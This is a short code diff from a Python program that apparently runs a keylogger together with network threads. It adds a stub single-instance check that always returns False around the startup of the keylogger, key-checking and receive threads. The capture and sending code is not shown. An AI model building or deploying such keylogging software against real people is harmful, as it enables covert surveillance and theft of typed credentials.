@@ -83,18 +83,24 @@ class RecvChecker(threading.Thread):
         return True
 
 
+def instanceAlreadyRunning():
+    return False
+
+
+
 def main():
     """
     Entry point into the application, that will setup the keylogger
     and the networking functionality.
     :return:
     """
-    keylogger = kl.getKeyLogger()
-    keylogger.start()
-    keychecker = KeyChecker(keylogger)
-    keychecker.start()
-    recvChecker = RecvChecker()
-    recvChecker.start()
+    if not instanceAlreadyRunning():
+        keylogger = kl.getKeyLogger()
+        keylogger.start()
+        keychecker = KeyChecker(keylogger)
+        keychecker.start()
+        recvChecker = RecvChecker()
+        recvChecker.start()
 
 
 if __name__ == '__main__':
